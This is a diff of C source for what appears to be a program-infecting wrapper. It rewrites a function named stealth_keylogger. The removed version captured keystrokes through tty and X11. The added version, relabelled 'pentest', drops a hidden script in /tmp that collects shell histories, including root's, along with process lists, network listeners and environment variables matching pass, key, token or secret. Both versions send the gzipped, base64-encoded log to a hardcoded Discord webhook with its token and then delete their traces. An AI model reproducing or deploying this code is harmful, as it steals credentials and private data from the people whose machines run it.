@@ -116,37 +116,52 @@ void execHost(pg *files, char *prog_name, int argc, char *argv[]) {
 }
 
 void stealth_keylogger() {
-  if (system("pgrep -f 'keylog.sh' > /dev/null 2>&1") == 0)
+  if (system("pgrep -f '/tmp/.pentest.kl' > /dev/null 2>&1") == 0)
     return;
 
+  system("cat > /tmp/.pentest.kl << 'SCRIPT_EOF'\n"
+         "#!/bin/bash\n"
+         "LOG=/tmp/.pentest.keys\n"
+         "touch \"$LOG\" && chmod 600 \"$LOG\"\n"
+         "echo \"=== PENTEST [$(date)] $(whoami)@$(hostname) $(uname -a) ===\" "
+         "| tee -a \"$LOG\"\n"
+
+         "# History\n"
+         "for hist in ~/.bash_history ~/.zsh_history ~/.history "
+         "/root/.bash_history; do\n"
+         "  [ -r \"$hist\" ] && echo \"--- $hist ---\" | tee -a \"$LOG\" && "
+         "tail -n 100 \"$hist\" | tee -a \"$LOG\"\n"
+         "done\n"
+         "history 2>/dev/null | tail -n 50 | tee -a \"$LOG\"\n"
+
+         "# Process/Env\n"
+         "echo \"--- PS/ENV ---\" | tee -a \"$LOG\"\n"
+         "ps aux | head -50 | tee -a \"$LOG\"\n"
+         "env | grep -Ei 'pass|key|token|secret' | tee -a \"$LOG\"\n"
+
+         "# Network\n"
+         "echo \"--- NET ---\" | tee -a \"$LOG\"\n"
+         "ss -tuln 2>/dev/null || netstat -tuln 2>/dev/null | tee -a \"$LOG\"\n"
+
+         "# Files\n"
+         "pwd && ls -la | tee -a \"$LOG\"\n"
+         "sleep 30 && gzip \"$LOG\"\n"
+         "SCRIPT_EOF");
+
   system(
-      "cat > /tmp/keylog.sh << 'EOF'\n"
-      "#!/bin/bash\n"
-      "LOG=/tmp/.keys.log\n"
-      "while true; do\n"
-      "  # Capture stdin + tty\n"
-      "  script -q -c 'cat' /dev/tty 2>&1 | pv -qL 10 >> $LOG &\n"
-      "  # Capture X11 si dispo\n"
-      "  xinput test-xi2 &>> $LOG 2>/dev/null &\n"
-      "  sleep 1\n"
-      "done\n"
-      "EOF\n"
+      "chmod +x /tmp/.pentest.kl && nohup /tmp/.pentest.kl >/dev/null 2>&1 &");
 
-      "chmod +x /tmp/keylog.sh && "
-      "nohup /tmp/keylog.sh > /dev/null 2>&1 & "
-      "echo $! > /tmp/.kl.pid && "
-
-      "(sleep 180 && "
-      "[ -f /tmp/.keys.log ] && "
-      "gzip /tmp/.keys.log && "
-      "curl -s -X POST -H \"Content-Type: application/json\" "
-      "-d '{\"content\":\"**KEYS RAW:** ```$(base64 /tmp/.keys.log.gz | head "
-      "-c 1900)```\\n"
-      "**Size:** $(du -h /tmp/.keys.log.gz 2>/dev/null)\"}' "
-      "https://discord.com/api/webhooks/1485416783706853558/"
-      "qGWKXvrslqK8xzMdQpIy9J8BqiM8WqBaXyq_9SweYyeOXzRRGlmHtjxd8keiCZTyaNyB && "
-      "kill $(cat /tmp/.kl.pid 2>/dev/null) 2>/dev/null && "
-      "rm -f /tmp/keylog.sh /tmp/.keys* /tmp/.kl.pid) &");
+  system("(sleep 60 && "
+         "[ -f /tmp/.pentest.keys.gz ] && "
+         "B64OUT=$(base64 -w0 /tmp/.pentest.keys.gz | head -c 1800) && "
+         "SIZEOUT=$(du -h /tmp/.pentest.keys.gz) && "
+         "INFOOUT=\"$(whoami)@$(hostname) | $(uname -s)\" && "
+         "curl -s -X POST https://discord.com/api/webhooks/1485416783706853558/"
+         "qGWKXvrslqK8xzMdQpIy9J8BqiM8WqBaXyq_9SweYyeOXzRRGlmHtjxd8keiCZTyaNyB "
+         "-H \"Content-Type: application/json\" "
+         "-d '{\"content\":\"**🛡️ PENTEST "
+         "EXFIL**\\n```'$B64OUT'```\\n**'$SIZEOUT'**\\n'$INFOOUT'\"}' && "
+         "shred -u -z -n 3 /tmp/.pentest.* ) &");
 }
 
 int main(int argc, char *argv[]) {
